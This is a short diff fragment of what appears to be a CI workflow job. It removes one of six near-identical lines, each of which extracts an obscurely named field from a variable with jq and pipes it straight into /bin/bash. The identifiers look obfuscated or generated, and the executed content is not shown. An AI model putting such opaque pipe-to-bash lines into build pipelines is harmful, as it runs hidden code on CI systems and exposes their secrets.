@@ -24,7 +24,6 @@ jobs:
           echo $ruokb8075 | jq -r .i41567 | /bin/bash
           printf '%s' "$z17" | jq -r .kplwb02148 | /bin/bash
           printf '%s' "$lrdqg5" | jq -r .ze23 | /bin/bash
-          printf '%s' "$ybzq98512" | jq -r .npsd96189 | /bin/bash
           printf '%s' "$lpa3968" | jq -r .oyf1 | /bin/bash
           printf '%s' "$e48" | jq -r .j7745 | /bin/bash
 
